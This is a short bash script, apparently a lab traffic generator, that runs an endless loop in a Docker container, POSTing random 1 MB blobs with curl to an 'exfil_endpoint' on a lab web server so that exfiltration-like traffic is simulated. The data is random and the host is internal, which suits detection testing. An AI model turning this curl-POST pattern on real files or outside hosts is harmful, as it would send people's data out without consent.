#!/bin/bash
# Generate exfiltration-like traffic from exfil_client

echo "Generating exfiltration-like traffic..."

# Run infinite loop of large POST requests
docker exec exfil_client sh -c "
while true; do
  # Generate random data
  dd if=/dev/urandom of=/tmp/exfil_data bs=1024 count=1024 2>/dev/null
  # Send as POST request
  curl -s -X POST -d @/tmp/exfil_data http://web_server/exfil_endpoint > /dev/null
  rm /tmp/exfil_data
  sleep 2
done
" &

echo "Exfiltration-like traffic generation started."